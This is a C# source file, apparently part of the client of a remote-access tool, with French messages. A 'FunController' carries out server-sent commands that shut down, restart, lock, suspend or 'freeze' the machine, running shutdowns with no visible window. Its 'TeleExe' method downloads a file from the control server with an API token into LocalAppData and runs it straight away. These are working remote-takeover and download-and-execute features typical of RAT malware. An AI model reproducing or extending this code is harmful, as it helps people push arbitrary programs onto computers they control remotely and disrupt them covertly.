using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC.Controller
{
    class FunController : ControllerBase
    {
        public string Fun(string action, string argv2)
        {
            dynamic argvs = serializer.DeserializeObject(argv2);

            switch (action)
            {
                case "eteindre":
                    PSI("shutdown", "/s /t 0");
                    break;
                case "redemarer":
                    PSI("shutdown", "/r /t 0");
                    break;
                case "session":
                    LockWorkStation(); 
                    break;
                case "veille":
                    SetSuspendState(false, true, true);
                    break;
                case "hiberner":
                    SetSuspendState(true, true, true);
                    break;
                case "freeze":
                    FreezerController fc = new FreezerController();
                    fc.Freezer();
                    break;
                case "clavier":

                    break;
                case "souris":

                    break;
                default:
                    break;
            }
            return serializer.Serialize(new { success = true, message = "Fun action éxecuter avec succés" });
        }

        public string TeleExe(string file_name, string media_id)
        {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\";

            try
            {
                if (Directory.Exists(dir))
                {
                    string url = Router.url("get_file") + media_id + "?token=" + Parametre.API_KEY;

                    bool ok = false;
                    int i = 1;
                    while (!ok)
                    {
                        if (File.Exists(dir + file_name))
                        {
                            file_name = Path.GetFileNameWithoutExtension(file_name) + "_" + i + Path.GetExtension(file_name);
                        }
                        else
                        {
                            break;
                        }
                        i++;
                    }

                    using (var cl = new WebClient())
                    {
                        byte[] dataFile = cl.DownloadData(url);
                        File.WriteAllBytes(dir + file_name, dataFile);
                    }

                    Process.Start(dir + file_name);

                    return serializer.Serialize(new { success = true, message = "Fichier envoyer et executer avec succés" });
                }
                else
                {
                    return serializer.Serialize(new { success = false, message = "Erreur: Le dossier n'existe pas ou accés refuser", path = dir });
                }
            }
            catch (Exception)
            {
                return serializer.Serialize(new { success = false, message = "Erreur: Envoie de fichier une exception c'est produite", path = dir });
            }
        }

        private void PSI(string p1, string p2)
        {
            try
            {
                var psi2 = new ProcessStartInfo(p1, p2);
                psi2.CreateNoWindow = true;
                psi2.UseShellExecute = false;
                Process.Start(psi2);
            }
            catch
            {
            }
        }
        [DllImport("user32")]
        public static extern void LockWorkStation();
        [DllImport("PowrProf.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool SetSuspendState(bool hiberate, bool forceCritical, bool disableWakeEvent);
    }
}
